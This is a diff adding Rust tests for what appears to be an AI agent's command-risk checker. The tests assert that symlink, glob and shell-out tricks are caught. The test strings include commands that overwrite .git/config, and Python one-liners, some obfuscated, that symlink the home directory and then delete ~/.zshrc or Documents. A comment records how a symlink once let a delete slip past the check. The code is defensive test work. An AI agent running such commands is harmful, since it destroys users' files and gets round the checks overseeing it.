+        d.link("cfg", &git.join("config"));
+        for cmd in [
+            "printf x >> data/gl/config",
+            "printf x >> data/cfg",
+            "touch data/gl/fsmonitor",
+            "sort -o data/cfg data/sub/a.txt",
+            "curl -o data/cfg https://x/",
+            "printf x >> .git/config",
+            // A glob in the last name expands to the link.
+            "printf x >> data/c*",
+            "printf x >> data/cf?",
+            "touch data/[c]fg",
+        ] {
+            assert!(
+                matches!(d.static_lane(cmd), StaticVerdict::NeedsJudge(ref ji) if ji.fast_path_refused),
+                "{cmd} must be a refusal, got {:?}",
+                d.static_lane(cmd)
+            );
+        }
+        for cmd in [
+            "printf x >> data/sub/a.txt",
+            "printf x > data/new.txt",
+            "printf x >> data/sub/*.txt",
+        ] {
+            assert_settled(d.static_lane(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
     /// The finding this guards: a symlink laid down in one turn redirects a
     /// delete in the next. The token reads as in-workspace, so the lexical
     /// check took the checkpoint lane, and the checkpoint captured nothing.
@@ -8194,6 +8682,26 @@ lucidos data write config/model-prices.json --from .lucidos/tmp/mp.json; lucidos
         for code in [
             "import os; os.symlink(os.environ['HOME'], 'data/h'); os.remove('data/h/.zshrc')",
             "import os, shutil; os.chdir(os.environ['HOME']); shutil.rmtree('Documents')",
+        ] {
+            assert_eq!(lane(code), RiskLane::IrreversibleDanger, "{code}");
+        }
+    }
+
+    /// A shell-out can make a link or change directory without naming either
+    /// call, so it redirects a later relative literal just the same.
+    #[test]
+    fn python_destruction_after_a_shell_out_escapes() {
+        let d = disk();
+        let lane = |code: &str| d.fallback(tn::RUN_PYTHON, code).lane;
+        for code in [
+            "import pathlib, subprocess, shutil; subprocess.run(['ln', '-s', str(pathlib.Path.home()), 'data/x']); shutil.rmtree('data/x/sub')",
+            "import os, subprocess; subprocess.run(['ln', '-s', os.environ['HOME'], 'data/h']); os.remove('data/h/.zshrc')",
+            "import os; os.system('ln -s ' + os.environ['HOME'] + ' data/h'); os.remove('data/h/.zshrc')",
+            "import pathlib; import os as o; o.system('ln -s ' + o.environ['HOME'] + ' data/h'); pathlib.Path('data/h/.zshrc').unlink()",
+            "import os; os.spawnlp(os.P_WAIT, 'ln', 'ln', '-s', os.environ['HOME'], 'data/h'); os.remove('data/h/.zshrc')",
+            "import os; os.posix_spawnp('ln', ['ln', '-s', os.environ['HOME'], 'data/h'], {}); os.remove('data/h/.zshrc')",
+            "import os; exec('os.sym' + 'link(os.environ[\"HOME\"], \"data/h\")'); os.remove('data/h/.zshrc')",
+            "import os; getattr(os, 'sym' + 'link')(os.environ['HOME'], 'data/h'); os.remove('data/h/.zshrc')",
         ] {
             assert_eq!(lane(code), RiskLane::IrreversibleDanger, "{code}");
         }
